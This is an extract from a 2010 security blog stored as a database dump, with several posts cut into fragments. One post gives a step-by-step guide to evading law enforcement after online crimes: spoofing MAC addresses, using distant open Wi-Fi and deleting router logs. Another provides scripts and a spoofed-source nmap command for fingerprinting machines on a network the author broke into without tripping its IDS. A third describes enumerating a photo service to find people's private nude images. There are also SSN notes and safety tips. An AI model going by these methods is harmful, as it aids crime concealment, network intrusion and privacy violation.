 The TOR IP changes, the source IP changes.  And, even if they were to track it back to the wireless you\'re physically miles and miles and miles away with no association with that wireless network.  I would never reuse one that I\'ve already used once for something illegal.  Last thing I want is for the SWAT team to firebomb my car because I\'m using the same wireless network as I did last week and they\'ve finally tracked it down.\n\nMake CERTAIN that the proxy that you\'re using is properly configured, as mentioned in my post \"<a href=\"http://www.attackvector.org/browser-headers-and-information-leaks/\">Browser Headers and Information Leaks</a>\"  You don\'t want to spend all this time searching for a proxy, spoofing your mac, finding a far out wireless network, only to have the proxy that you use send x_forwarded_for out with every header.  Kind of defeats the purpose.\n\n3) Spoof your mac address.  I know I knocked it a few paragraphs ago, but used in conjunction with #1 and #2, this just adds an additional layer.\n\n4) Change the finger print of your browser.  User agent, version, etc.  Hell, make it random.  I have an idea for a real simple shell script/perl script that would start Chromeum using a randomly selected user agent from an array of user agents, I just haven\'t gotten around to it yet.\n\n5) Make sure that the laptop that you\'re using is secure.  You don\'t want people to be able to grab info from your laptop remotely.  This will make it more difficult to finger print you.  If you run Linux, make your box come across as Windows, if you run Windows, pretend to bet Mac OSX.  The more obfuscated the trail is, the more difficult you make their job.  Eventually they\'ll hit a point where they wonder if you\'re even worth the man hours that they\'re putting in.  Obviously, this is dependent upon the crime you\'ve committed.  I\'m not sure where presidential death threats fall.  Probably pretty high up there, I would imagine.\n\n6) Do NOT use the identity of someone that you know.  Why?  Obviously you\'ve never heard of the <a href=\"http://en.wikipedia.org/wiki/Six_degrees_of_separation\">6 degrees of separation.</a>.  Choose a random name.. Bob Barker, Kevin Smith, John Hormone, something.  You don\'t want anything linking to you in any way.\n\n7) Try to use an OPEN wireless network.  Not everyone possesses the skill to hack a \"secured\" wireless network.  If, somehow, they get back to you and find that you have the aircrack suite and a bunch of custom scripts to make it easier, it\'s going to be hard to deny that you hack wireless networks.  If, however, the wireless network that was owned was open and could be used by anyone who happens to drive by their house, well.. this pretty much raises the \"reasonable doubt\" issue.\n\n8 ) Most wireless routers keep logs of connected clients and/or web sited visited (ActionTec\'s do this).  You will want to delete these.  This should be a no brainer.  No logs, no evidence.  \n\nIn closing, just remember.. you don\'t want to create a trail, and the trail that you do leave is winding, confusing, and convoluted.  You want to create separation between you and the networks used, both physical and digital separation.  \n\nOperate like a ninja;  Dark, anonymous, quiet.\n\n\n','','2010-06-28 13:14:14','2010-06-28 18:14:14','','','2010-06-28 13:14:14','2010-06-28 18:14:14','man-charged-with-hacking-neighbors-wi-fi-to-threaten-biden','0','','publish','Man charged with hacking neighbors Wi-Fi to threaten Biden','post',''),(

Everyone knows this, right?  But did you know that those numbers represent stuff?\n\nFor example, the first three digits (known as \"Area Numbers\") indicate the state of birth.  Here\'s the cross reference:\n\n<!--more-->\n[update]\n\nOne of my readers pointed out that not necessarily are the first three digits the state of birth.  Here\'s the explanation:\n\n<blockquote>\nThe area numbers were assigned to geographical locations in a manner\nanalogous to the way in which ZIP codes were later assigned (in particular,\narea numbers increase from east to west across the continental US as do the\nZIP codes).  Most area numbers were assigned according to state (or\nterritorial) boundaries, although the series 700-729 was assigned to\nrailroad workers regardless of location (this series of area numbers was\ndiscontinued in 1964 and is no longer used for new SSNs).  With few\nexceptions, each geographical area is assigned a range of area numbers.\nArea numbers assigned prior to 1972 are an indication of the location of the\nSSA office which originally issued the SSN.  Since 1972 SSNs have been\nissued centrally and the area number in SSNs assigned since 1972 corresponds\nto the residence location of the applicant as indicated on the application\nfor the SSN.\n</blockquote>\n\nAdditionally, I just found a new tool that seems kind of interesting.. check it out <a href=\"http://stevemorse.org/ssn/ssn.html\" rel=\"nofollow\" target=\"_blank\">here</a>\n\n[/update]\n\n<table>\n<tr>\n  <td width=\"15%\">001-003</td><td width=\"15%\">New Hampshire</td><td width=\"15%\">400-407</td><td width=\"15%\">Kentucky</td><td width=\"15%\">530</td><td width=\"25%\">Nevada</td>\n</tr>\n<tr>\n  <td>004-007</td><td>Maine</td><td>408-415</td><td>Tennessee</td><td>531-539</td><td>Washington</td>\n</tr>\n<tr>\n  <td>008-009</td><td>Vermont</td><td>416-424</td><td>Alabama</td><td>540-544</td><td>Oregon</td>\n</tr>\n<tr>\n  <td>010-034</td><td>Massachusetts</td><td>425-428</td><td>Mississippi</td><td>545-573</td><td>California</td>\n</tr>\n<tr>\n  <td>035-039</td><td>Rhode Island</td><td>429-432</td><td>Arkansas</td><td>574</td><td>Alaska</td>\n</tr>\n<tr>\n  <td>040-049</td><td>Connecticut</td><td>433-439</td><td>Louisiana</td><td>575-576</td><td>Hawaii</td>\n</tr>\n<tr>\n  <td>050-134</td><td>New York</td><td>440-448</td><td>Oklahoma</td><td>577-579</td><td>District of Colombia</td>\n</tr>\n<tr>\n  <td>135-158</td><td>New Jersey</td><td>449-467</td><td>Texas</td><td>580</td><td>Virgin Islands</td>\n</tr>\n<tr>\n  <td>159-211</td><td>Pennsylvania</td><td>468-477</td><td>Minnesota</td><td>581-584</td><td>Puerto Rico</td>\n</tr>\n<tr>\n  <td>212-220</td><td>Maryland</td><td>478-485</td><td>Iowa</td><td>585</td><td>New Mexico</td>\n</tr>\n<tr>\n  <td>221-222</td><td>Delaware</td><td>486-500</td><td>Missouri</td><td>586</td><td>Pacific Islands</td>\n</tr>\n<tr>\n  <td>223-231</td><td>Virginia</td><td>501-502</td><td>North Dakota</td><td>587-588</td><td>Mississippi</td>\n</tr>\n<tr>\n  <td>232-236</td><td>West Virginia</td><td>503-504</td><td>South Dakota</td><td>589-595</td><td>Florida</td>\n</tr>\n<tr>\n  <td>237-246</td><td>North Carolina</td><td>505-508</td><td>Nebraska</td><td>596-599</td><td>Puerto Rico</td>\n</tr>\n<tr>\n  <td>247-251</td><td>South Carolina</td><td>509-515</td><td>Kansas</td><td>600-601</td><td>Arizona</td>\n</tr>\n<tr>\n  <td>252-260</td><td>Georgia</td><td>516-517</td><td>Montana</td><td>602-626</td><td>California</td>\n</tr>\n<tr>\n  <td>261-267</td><td>Florida</td><td>518-519</td><td>Idaho</td><td>627-645</td><td>Texas</td>\n</tr>\n<tr>\n  <td>268-302</td><td>Ohio</td><td>520</td><td>Wyoming</td><td>646-647</td><td>Utah</td>\n</tr>\n<tr>\n  <td>303-317</td><td>Indiana</td><td>521-524</td><td>Colorado</td><td>648-649</td><td>New Mexico</td>\n</tr>\n<tr>\n  <td>318-361</td><td>Illinois</td><td>525</td><td>New Mexico</td><td>362-386</td><td>Michigan</td>\n</tr>\n<tr>\n  <td>526-527</td><td>Arizona</td><td>387-399</td><td>Wisconsin</td><td>528-529</td><td>Utah</td>\n</tr>\n</table>\n<table>\n<tr><td>\n  650-699 unassigned, for future use\n</td></tr>\n<tr><td>\n  700-728 Railroad workers through 1963, then discontinued\n</tr></td>\n<tr><td>\n  729-799 unassigned, for future use\n</tr></td>\n<tr><td>\n  800-999 not valid SSNs.

Neat, right?\n\nThe middle two numbers are called the \"Group Numbers\".  I\'m going to quote this rather than try to explain it myself..\n\n<blockquote>\nThe group number is not related to geography but rather to the order in which SSNs are issued for a particular area. Before 1965, only half the group numbers were used: odd numbers were used below 10 and even numbers were used above 9. In 1965 the system was changed so assignments continued with the low even numbers and the high odd numbers. So, group numbers for each area number are assigned in the following order:\n\nOdd numbers, 01 to 09\nEven numbers, 10 to 98\nEven numbers, 02 to 08\nOdd numbers, 11 to 99\nGroup codes of \"00\" aren\'t assigned\n\nIn each region, all possible area numbers are assigned with each group number before using the next group number. This means the group numbers can be used to find a chronological ordering of SSNs within a region. When new group numbers are assigned to a state, the old numbers are usually used up first.\n\nSSA publishes a list every month of the highest group assigned for each SSN Area. For example, if the highest group assigned for area 999 is 72, then we know that the number 999-04-1234 is an invalid number because even Groups under 9 have not yet been assigned.\n</blockquote>\n\nThen we\'re left with the serial number:\n\n<blockquote>\nSerial numbers are assigned in chronological order within each area and group number as the applications are processed. Serial number \"0000\" is never used. Before 1965, when number assignment was transferred from field offices to the central office, serial numbers may have been assigned in a strange order. (Some sources claim that 2000 and 7000 series numbers were assigned out of order. That no longer seems to be the case.) Currently, the serial numbers are assigned in strictly increasing order with each area and group combination.\n</blockquote>\n\nSomething to ponder.. it\'s rather trivial to get the last 4 of someones social security number.. because they\'re 4 digits, they\'re \"perfect\" for 4 digit pin numbers (hint: NEVER USE THE LAST 4 OF YOUR SOCIAL SECURITY NUMBER AS YOUR PIN.

Essentially, they remove any and all accountability for internet crimes.  It also allows hackers to evade bans, blacklists, etc.  I know, because I\'ve used them for that purpose.  ;-)\n\nBut, I also run and manage production servers, which means that I\'m on the opposite side of the fence as well, so I know what it\'s like to be attacked, blacklist, and have them continue the attack from a different IP block.  Whether that be through the use of open WiFi\'s, proxies, bounces, botnets, whatever.  It\'s obnoxious and drives me nuts, because generally the people using this technique are ankle biters.  Because they have the anonymity, they don\'t bother trying to be quiet, or stealthy.. they\'ll whip out Hydra and start brute forcing all of my services, or running \"auto_pwn\" against me.  No, it wont succeed, but it sets of my alarms, fills my logs, and is incredibly annoying.\n\nSo, should there be a punishment for stupidity?  I mean, I believe that all acts of stupidity or ignorance should be punishable, but very rarely do people agree with me.  Also, I\'m usually a little more lax in my judgement of end users because all they want to do is have a computer to get on the internet and look up porn, and maybe facebook.  They don\'t want to know what WPA is, or how a firewall really works.  Or why they should use FireFox or Chrome instead of IE.  I mean, I get it.. I\'m not particularly interested in how the catalytic converter in my car works.. I just want a car that I can get in and get to my destination.\n\nBut.. if I\'m driving a car that is unfit for the road, risking the lives and property of others, should I be fined?  Yes, yes I should, and I would be.  So, I do agree with this ruling, in a way.\n\nAnyone from Germany reading this?

Well, here\'s a real life example of the benefit of a strong password\n\n<blockquote>\nThe FBI has admitted defeat in attempts to break the open source encryption used to secure hard drives seized by Brazilian police during a 2008 investigation.\n</blockquote>\n(Source: <a href=\"http://www.computerworlduk.com/technology/security-products/security/news/index.cfm?RSS&newsid=20900\" rel=\"nofollow\" target=\"_blank\">ComputerWorld UK</a>)\n\nThe encryption software used to secure these drives is called TrueCrypt.  I think more credit is given to TrueCrypt than is necessary in this article, considering it wasn\'t so much what TrueCrypt was doing as it was what Daniel Dantas did.  He used a strong password.\n\n<!--more-->\n\n<blockquote>\nExperts in both countries apparently spent months trying to discover the passphrases using a dictionary attack, a technique that involves trying out large numbers of possible character combinations until the correct sequence is found.\n</blockquote>\n\n<b>\"...spent months...\"</b>\n\nThat\'s impressive, considering the type of hardware the FBI has access to.  For the sake of having it, I would love to actually find out what his password is.  I mean, is it ridiculously long?  Or is it simply a solid 8 character, mixed case, alphanumeric?\n\nThe one part of this article that really got my attention, though, was this:\n\n<blockquote>\nTrueCrypt also uses what is termed a \'deniable file system\' approach to encrypting whole hard drives. Under this design, the existence of the encrypted partition will not be obvious to anyone examining the drive allowing the individual using such encryption to plausibly deny its existence.\n</blockquote>\n\nI don\'t use encryption much on local disks, primarily because I don\'t have anything on my local disks that I feel I need to hide from anybody.  Hell, most of what I have on my disks I post here.. so!\n\nBut, I\'m thinking if I WERE storing something that I didn\'t want ever to be discovered, the concept behind this \"deniable file system\" feature sounds pretty awesome.  Plus, it\'s open source, which gives me warm fuzzies.\n\nAnyway, I was merely posting this because I felt it gave some evidence to my claims in \"<a href=\"http://www.attackvector.org/how-your-passwords-get-hacked/\">How Your Passwords Get Hacked</a>\"\n\nTrueCrypt can be found at <a href=\"http://www.truecrypt.org/\" rel=\"nofollow\" target=\"_blank\">http://www.truecrypt.org/</a>','','2010-06-30 10:54:47','2010-06-30 15:54:47','','','2010-06-30 10:54:47','2010-06-30 15:54:47','the-benefit-of-a-strong-password','0','','publish','The Benefit of a Strong Password','post',''),(
'422','4','open','http://www.attackvector.org/?p=422','0','open','','2','Today I was tasked with doing some passive OS detection on a network where I actually had to be somewhat stealthy.  I had gotten into the gateway, but I actually needed one of the other boxes on the network in order to get to the file server due to firewalling/routing.  I knew they were running IDS on a few different boxes on this subnet and I didn\'t want to trip them, so I had to ponder for a bit and came up with this...\n<!--more-->\n\nBecause I was on the gateway, I could see traffic on the network.  By running p0f, I could sit there and monitor and, eventually, find out the OS\'s of each box.  This would have taken far too long, though.  I needed to speed things up.\n\nI wrote a quick and dirty script to execute p0f and sanitize the output:\n\n<pre lang=\"perl\" line=\"1\">\n#!/usr/bin/perl\n\nopen(F, \"p0f -i eth1 -q -N -R|\") || die \"$!\";\nwhile(<F>) {\n  if(/^(.*?):d+.*?-s+(.*)/ && $disc{$1} eq \"\") {\n    print \"$1 - $2n\";\n    $disc{$1}++;\n  } else {\n    next;\n  }\n}\n</pre>\n\n(Like I said, quick and dirty.. :-P)\n\nWhat this does, is it listens for RST+ACK packets being sent and is able to fingerprint the OS sending the RST+ACK.  Now, what I needed to do is generate the RST+ACK packets without giving myself away.\n\nI had a few choices.  RST+ACK packets are generated when sending a SYN packet to a closed port on a machine.  I could easily write something to do this...\n\n<pre lang=\"perl\" line=\"1\">\n#!/usr/bin/perl\nuse Net::RawIP;\n\nsub randip() {\n  $ip = join(\".\", map int rand 256, 1 .. 4);\n  return(\"$ip\");\n}\n\n$syn = new Net::RawIP;\n\ndie \"Usage: $0 network port source portnExample: $0 10.0.0 123 80n\"\nunless ($ARGV[0] && $ARGV[1] && $ARGV[2]);\n\nprint \"Firing packets...n\";\n\nwhile($i <= 254) {\n  $i++;\n  $dest = join(\".\", $ARGV[0], $i);\n  print \"$destn\";\n  $syn->set({\n    ip => {\n        daddr => $dest,\n        saddr => &randip,\n        },\n\n    tcp => {\n        dest => $ARGV[1],\n        source => $ARGV[2],\n        syn => 1,\n      }\n    });\n  $syn->send;\n}\n</pre>\n\nBut it would require me to (probably) install the Net::RawIP perl module, plus I\'d have to actually write it, yadda yadda.. so I decided to use nmap, my trusty old friend that is pretty much installed by default on all Linux distros these days.\n\n<blockquote>\n$ ./0day nmap -sS -S 128.8.5.2 -p123 -g 53 -e eth1 -PN 10.0.0.* -T2\n</blockquote>\n\nThis is telling nmap to send SYN packets from 128.8.5.2 (a root nameserver) to port 123 (ntp) from port 53 (dns) over interface eth1, don\'t send pings, to the 10.0.0.* subnet, with a sane timing.  Because of timing, and that each box will only receive one packet, and the ports used, I expect that this packet will go unnoticed.  I needed to spoof the source, because it would have been obvious that something was up if the gateway all of a sudden was firing off these packets to the network.\n\nMy little script shows me this:\n\n<blockquote>\n$ ./0day ./sniff.pl\n10.0.0.x - Linux recent 2.4 (dropped) \n10.0.0.x - Windows XP/2000 (refused) \n10.0.0.x - FreeBSD 4.8 (refused) (firewall!) \n10.0.0.x - Windows XP/2000 (refused) \n10.0.0.x - Windows XP/2000 (refused) \n10.0.0.x - Windows XP/2000 (refused) \n10.0.0.x - FreeBSD 4.8 (refused) \n10.0.0.x - FreeBSD 4.8 (refused) (firewall!) \n10.0.0.x - FreeBSD 4.8 (refused) (firewall!) \n10.0.0.x - FreeBSD 4.8 (refused) (firewall!) \n10.0.0.x - Linux recent 2.4 (refused) \n10.0.0.x - Windows XP/2000 (refused) \n10.0.0.x - Windows XP/2000 (refused) \n10.0.0.x - Windows XP/2000 (refused) \n</blockquote>\n\nI know that the workstations are running XP, so those are the ones that I want to target.  Once I\'m able to gain access to a workstation, I will have access to the subnet that the file server resides on.  Additionally, I could look for any SQL databases running and attempt to access the subnet through that, or a web server, or, or, or, but workstations are generally the easiest to compromise, so I always start with them when possible.\n','','2010-06-30 13:16:00','2010-06-30 18:16:00','','','2010-06-30 13:16:00','2010-06-30 18:16:00','p0f-and-mostly-passive-finger-printing','0','','publish','p0f and (mostly) Passive Finger Printing','post',''),(
'424','9','open','http://www.attackvector.org/?p=424','0','open','','2','Never thought I\'d be writing a \"Top 10\" list, but I get asked this question often enough that I figured I\'d just list off a few ways that people can better protect themselves from hackers, identity theft, and the random mayhem that takes place on the internet.  I\'m going to try to order it according to what I believe is priority.\n\nSo, without further adieu....\n\n<!--more-->\n\n10) <b>Make sure your social sites aren\'t leaking information</b>\n\nAs I\'ve shown here many times now, social networking provides a wealth of information to someone interested.  Whether it\'s your location, family, friends, etc., it\'s all available there for someone looking.  You want to share this information with your friends, but not with people who just stumble across your Facebook page.  Right now, go spend 5 minutes checking and double-checking your privacy settings.  It\'s under \"Account\" at the top right of your Facebook page.  Also, this is kind of a sub point of #10.  Don\'t divulge your address/phone number when posting on someones wall or responding to someone posting on your wall.  Bad. Idea.  Email it to them, if necessary.  Or, pick up the phone!\n\n9) <b>Don\'t randomly accept friend requests on social sites</b>\n\nI understand the idea is to be social and meet new people on these sites.  However.  If I can\'t get information from your page anonymously, I will simply set up a fake Facebook account and send you a friend request.  9 times out of 10 it will get accepted and I will have all of the information that you spent the last 5 minutes trying to secure.\n\n8 ) <b>Keep your computer up to date</b>\n\nDon\'t put off updates.  When a pop-up gets displayed saying that updates are available, it actually means something.  Most of the exploits that are out there today would be obsolete if people followed a strict update policy.  This also includes anti spyware/malware and virus software as well.\n\n7) <b>Secure your wireless network</b>\n\nMost people don\'t really realize the risk of leaving their wireless network open.  I think they understand that it means that anyone can use their internet connection, but I don\'t think they understand the issues beyond that.  Honestly, here\'s what an open wireless network allows me to do:  \n\n<li>I can sniff all of your information going out to the internet.  Credit card numbers, social security numbers, pictures, chats, everything.</li>\n<li>I can browse through your files, email, etc.  Lets hope you don\'t have any risque pictures on your computer of yourself, because if you do, I\'ll have them, too</li>\n<li>I can take over your computer, your web cam, your mic.  So, not only will I see all of your communications, I\'ll be able to listen to you and watch you when you\'re not even ON the computer</li>\n<li>I can commit crimes online and have you take the heat for them because I\'ll be using your internet connection.</li>\n\nAre you taking wireless security seriously yet?  Visit the website of the vendor of your wireless equipment and learn how to enable WPA level security.  No, it\'s not perfect, but if I\'m faced with a house that has a WEP secured wireless and one that\'s using WPA, I\'ll choose the WEP network every time.  Also, look into how to turn off SSID broadcasting.  If I\'m war driving and your SSID doesn\'t pop up, I wont be targeting it.  These are simple steps that you can take to mitigate your exposure.\n\n7.1) Windows now ships with firewall software built into it.  Spend some time configuring it and making sure that it\'s set up properly.  You can go through the document <a href=\"http://technet.microsoft.com/en-us/library/cc875811.aspx\" rel=\"nofollow\" target=\"_blank\">here</a> to help guide you through the process of configuring it.  If you\'re using Linux, there are plenty of scripts out there to help with iptables, though if you\'re running Linux, you really should know how to use iptables via the command line.. *cough*.\n\n6) <b>Do NOT use Internet Explorer</b>\n\nInternet Explorer is constantly being exploited using new vulnerabilities.  These vulnerabilities lead to spyware, malware, and virus infection.  Not to mention that someone could specifically target you, take over your computer, read your email, turn on your webcam, etc etc etc.  Do. Not. Use. It.  Period.  For someone looking simply to replace IE without any issues, use <a href=\"http://www.getfirefox.com\" rel=\"nofollow\" target=\"_blank\">FireFox</a>.  For those who prefer an even faster, more secure experience and are willing to put up with some minor quirks, check out <a href=\"http://www.google.com/chrome\" rel=\"nofollow\" target=\"_blank\">Google Chrome</a>.  I use Chrome and I love it, but there are some minor quirks that still need to be worked out that Google has been working on.  I prefer Chrome to Firefox, to be honest.\n\n5) <b>Use caution when clicking!</b>\n\nThis one is huge, but it\'s a little less of a threat if you followed #6.  When you\'re on the web (or in your email), the links that you click on can do things that you\'re not expecting.  On the internet, there are Rogue AntiVirus websites floating around that pop up and look almost identical to what you see when you go into \"My Computer\".  It also shows an apparent virus scan and then displays the results, indicating that you\'re loaded with viruses.  It then asks you to download something.  If you know what you\'re actually looking at, however, you can determine that this is fake.  Also, NEVER download a .exe, .com, .bat, .vbs, .what, .ever unless you\'ve specifically set out in search of this file and you\'re downloading it from a trusted source.  You can add .pdf to this list now, too, as .pdf\'s are riddled with bugs.\n\n4) <b>Choose a strong password!</b>\n\nEveryone in the IT industry keeps hounding you to use a complex password, yet I still see people using passwords like, \"meow01\" or \"woof02\" or \"meowoof03\".  Look at it this way, if you\'re using a password that you can pronounce, it can be guessed easily.  That said, if you were to use \"Me0w0oF58\", that would be quite a bit better than any of the previous three.  It\'s really hard for any of us involved in computer security to feel too sympathetic for people who get their identity stolen, their accounts hacked, or whatever, if they\'re using simple passwords to protect themselves.  Use this rule:  Two capital letters, two numbers, 8 characters long, not a word from the dictionary.  Using that policy, your passwords should wind up looking something like this: Hg89yZ46  Say that a few times and you\'ll start to hear a rhythm to it which will make it easier to remember.\n\n3) <b>Question everything</b>\n\nHackers regularly exploit human nature.. and we do a pretty good job at it.  We know that 9 times out of 10 when a human is faced with a certain scenario, that they\'ll respond in a certain way.  We know that humans feel good about themselves when they help someone else, so we can set up elaborate schemes where we, the hackers, act in distress in someway in order to trigger this human response.  Women are especially susceptible to this.  The easiest way to secure this vulnerability is by simply questioning and relying upon your instincts.  Everyone who has faced a social engineering exploit says the same thing:  \"It didn\'t feel right..\" or \"My gut told me not to but I did it anyway\" or \"It seemed fishy\", yet even though their entire being was telling them NOT to do something, the social pressure and desire to help someone overran their internal instinct to protect themselves.  By simply asking questions and going with your gut reaction, most social engineering attacks would fail.\n\n2) <b>Guard your information as if your life depended on it</b>\n\nThis ties in with #10.  So often I come across information on the internet that I simply cannot believe people intentionally put out there for other people to find.  Addresses, personal information, where you went to school, for how long, names of your children, name of your spouse, full names, etc.  If you read my \"<a href=\"http://www.attackvector.org/invasion-of-privacy\">Invasion of Privacy</a>\" post, you\'ll see what little information is needed in order to steal someones identity.  Because Ralph and his wife had no problem posting all of their information across the web, all I needed was his email address in order to get his social security number.  Websites like Myspace, Facebook, Linkedin, Twitter, so on and so forth are all gold mines for hackers, only because you like giving out information.  A real simple way to keep yourself in check:  Would you like everyone in the world to know the information that you\'re posting?  Do you want someone in North Korea to have your cell phone number and home address?  \"*shrug* I don\'t care..\"  Ok, do you want ME to have your cell phone number and home address?  If not, don\'t post it on the web!  Google will find the information and index it.  Once indexed, it\'s indexed for life.  It wont go away.  Ever.\n\nOne other way to guard your information is to enlist the help of professionals to monitor your credit and protect your personal details. The most recent <a href=\"http://www.nytimes.com/2010/08/17/opinion/17iht-edbeam.html\">Reputation Defender review</a> was very positive - and they are one of the more established companies who provides this type of service.\n\n1) <b>Use common sense</b>\n\nThese last two have basically focused on common sense.  If you use common sense, you will greatly reduce the risk of infection and exploitation.  If you get an email from one of your contacts that seems out of character that has a link or attachment, don\'t click on it.  If a web site opens a window asking you to download something, don\'t download it.  If someone contacts you, asking for information that you normally wouldn\'t give out, but this person is in need of some kind of help, don\'t go against your better judgment.  When posting stuff on the internet, don\'t divulge personal information.  When shopping online, verify that it\'s secured before submitting your credit card #.  The use of common sense would greatly reduce the issues that we face online.  Don\'t send your passwords through email.\n\nIf I asked you.. if some person in Nigeria emailed you, saying that they had $14.2 million dollars in an offshore account and just needed help getting it to a US account and were willing to give you half of it if you helped them.. would you give them your account information?  No?  Why not?  Don\'t laugh.. hundreds of people have fallen victim to this scam.  It exploits two human vulnerabilities.. kindness and greed.  Again, common sense and intuition could prevent this from ever working.\n\nAlso, there are plenty of <a href=\"http://cloudsecurity.trendmicro.com\">cloud security</a> solutions on the market that can keep your online data safe, so before registering a new account somewhere, make sure they\'re offering some form of protection.\n\nI hope you found these helpful and I\'d like to hear back from you.  I realize that I can\'t cover everything in 10 tips, but I feel that these are huge ones that really would help reduce some of the risk.

It talks about the different types of hackers that may have been behind the original stuxnet attack.\n\n(Credit: <a href=\"http://www.symantec.com\" rel=\"nofollow\" target=\"_blank\">Symantec</a>)\nW32.Stuxnet has received a lot of media attention over the last few days. This incident provides almost a complete case study of how these attacks succeed and how they will probably be used in the future. A successful attack allowed the attacker to steal confidential SCADA design and usage documents.\n\nLet’s start by saying we don’t know who is behind the attack, and historically discovering this is very rare. However, if someone proposed this type of attack a month ago, while we would have agreed it was theoretically possible, most would have dismissed such an attack as a movie-plot scenario. Furthermore, attacks of this nature are rarely disclosed publicly.\n<!--more-->\nWe know that the people behind this attack aren’t amateurs, but their final motive is unclear.\n\nThe principal facts in this case are:\n\n<li>The attackers discovered and used a zero-day vulnerability affecting all versions of Microsoft Windows.</li>\n<li>They developed and used a rootkit to hide their presence.</li>\n<li>They targeted software which is used to control industrial assets and processes; deep knowledge on the product internals was utilized.</li>\n<li>The hackers were able to sign their files using a legitimate digital certificate from an innocent third party. This digital certificate expired in June but a new driver appeared in July; it was also digitally signed using a digital certificate from another company. Both of these companies have offices in Taiwan. The hackers either stole private keys or were able to get their files signed. The attackers may have more compromised digital signatures.\n<li>The hackers did not use a targeted means of attack. Instead, the threat replicates to USB keys and can infect any Windows computer.</li>\n\nThe zero-day vulnerability, rootkit, main binaries, stolen digital certificates, and in-depth knowledge of SCADA software are all high-quality attack assets. The combination of these factors makes this threat extremely rare, if not completely novel.\n\nRead the rest of the article <a href=\"http://www.symantec.com/connect/blogs/hackers-behind-stuxnet\" rel=\"nofollow\" target=\"_blank\">here</a>\n','','2010-07-22 11:01:29','2010-07-22 16:01:29','','','2010-07-22 11:01:29','2010-07-22 16:01:29','the-hackers-behind-stuxnet','0','','publish','The Hackers Behind Stuxnet','post',''),(

It\'s floated around the internet for awhile, but it\'s still very, very relevant.  It discusses various different wireless threats (802.11, Bluetooth, et. al) and some easily executed exploits to attack these protocols.\n\nI think anyone who reads my blog is already very, very familiar with the threats against 802.11 networks, but I haven\'t covered the topic of Bluetooth much (at all?).  So, in case you haven\'t thought about the fun that could be had with Bluetooth, consider this:\n<!--more-->\n<li> Class 2 has a range of 10 meters (~32 feet), while a class 1 device has a range of 100 meters (~320 feet)</li>\n<li> It\'s a listening device.  Meaning, when it\'s not in use, it\'s essentially a bug.</li>\n<li> Easily pwnable.  Think about the pin used the last time you paired one of your BT devices.  Probably something like, \"0000\" or \"1234\", right?  Yeah....</li>\n<li> It\'s everywhere.  People walk around with their BT headset in wherever they go.  Beyond that, BT is built in to cars these days, and if not built into your car, it\'s probably built into the GPS that you put in your car (ie - Garmin Nuvi\'s).</li>\n\nJust so I\'m clear, this does not involve you being in an active conversation on the phone while using your BT device, this is you coming home and putting your headset on the counter and me listening to everything you say inside your house.  Or, me being stuck in traffic next to you and listening inside of your car through the BT in your Nuvi.\n\nAnyway, I think I\'m going to spend some more time focusing on Bluetooth.  It\'s not really an attack vector that I use during penetration testing currently, but I could see it being a very, very handy tool to have in my arsenal for social engineering purposes.\n\n<a href=\"http://www.attackvector.org/files/Wireless_Threats_Practical_Exploits.pdf\">Here\'s the link</a> to the document that was written by Joshua Wright @ Aruba Networks and is definitely a worth while quick read.\n\nUPDATE:\n\nHere\'s a video that was sent to me by one of my readers that demonstrates the process described in the document.\n\n<center>\n<object width=\"480\" height=\"385\"><param name=\"movie\" value=\"http://www.youtube.com/v/1c-jzYAH2gw&amp;hl=en_US&amp;fs=1\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://www.youtube.com/v/1c-jzYAH2gw&amp;hl=en_US&amp;fs=1\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"480\" height=\"385\"></embed></object>\n</center>','','2010-08-11 10:21:32','2010-08-11 15:21:32','','','2010-08-11 10:21:32','2010-08-11 15:21:32','wireless-threats-and-practical-exploits','0','','publish','Wireless Threats and Practical Exploits','post',''),(

Then, using the method I described in my post \"<a href=\"http://www.attackvector.org/social-sites-profile-pictures-and-privacy/\">Social Sites, Profile Pictures and Privacy</a>\", you could probably discover a lot more information about this person.\n\nBy itself, this isn\'t all that wonderful, but used in conjunction with other information gathering tricks, this could be very useful.  ;-)\n\n','','2010-08-11 14:59:07','2010-08-11 19:59:07','','','2010-08-11 14:59:07','2010-08-11 19:59:07','facebook-name-picture-extraction','0','','publish','Facebook Name & Picture Extraction','post',''),(

One of my readers (Thanks Mark!) supplied updated code that used a different LWP module to manipulate the user agent and changed the \'wget\' command to supply a fake user agent.\n\nWell, they caught on to that as well and decided to block access after X number of bad requests.  I took my original code, Mark\'s code, and new code, and created version 2 of my script which circumvents their attempts at blocking access.  It\'s pasted below.\n\n[/UPDATE]\n\nCatchy title, eh?\n\nI\'m sure most of you are familiar with the service \"picpaste\", which is, as the name implies, a simple service where people can upload a picture and give out the link to the picture for others to see, rather than having to send the actual picture through email, IM, whatever.\n\nSounds innocent enough, right?  Well.. not really.  Any service that allows you to \"anonymously\" upload data can be abused.  What I\'ve noticed is that a lot of people use picpaste for is uploading pornographic material.  The idea of someone posting naked pictures of themselves to a website that is supposedly anonymous and not available to the public is kind of hilarious.  I mean, what if the servers were to be hacked, or someone figured out a way to find the pictures.. do you really want nude pictures of you floating around the internet?\n<!--more-->\nWell, here\'s the problem with picpaste.  When you upload a picture (lets call it myrack.jpg).. picpaste adds it to their database as \"myrack.epochtime.jpg\", which means that enumeration would be.... difficult.  You\'d have to know the name of the picture and the time that it was uploaded in order to get it.  This is unlikely.\n\nHowever, the url that picpaste creates for the picture that you\'ve uploaded is a bit more simple.  When I upload my picture, I\'m given the link of \"www.picpaste.com/myrack.jpg\".  And if I upload the same picture again, they change the file name to \"myrack_1.jpg\".  So, duplicate file names are given a sequential number.  That makes enumeration trivial.\n\nWhen you visit the url, you\'ll notice that you can click on the image and by clicking on it, it will bring you to the original, fullsize picture.  And, by looking at the source code of the page, you\'ll see the path to \"myrack.epochtime.jpg\".  Bingo.  So now all you\'d have to do is write a script to automate the enumeration in order to find pictures of the subject matter that you\'re looking for...... ahem.\n\n<pre>\n$ ./picpaste.pl sexy\nFound: http://www.picpaste.com/pics/sexy.1281975513.jpg\nFound: http://www.picpaste.com/pics/sexy_1.1281975514.jpg\nFound: http://www.picpaste.com/pics/sexy_2.1281975514.jpg\nhttp://www.picpaste.com/sexy_3.jpg - Nothing found\nhttp://www.picpaste.com/sexy_4.jpg - Nothing found\nhttp://www.picpaste.com/sexy_5.jpg - Nothing found\n</pre>\n<p></p>\nWell, one thing is for sure, people have varying opinions of what is sexy and what is not... bleh.\n\nAnyway, here\'s the PoC.. it\'s pretty simple and featureless, but it gives you the 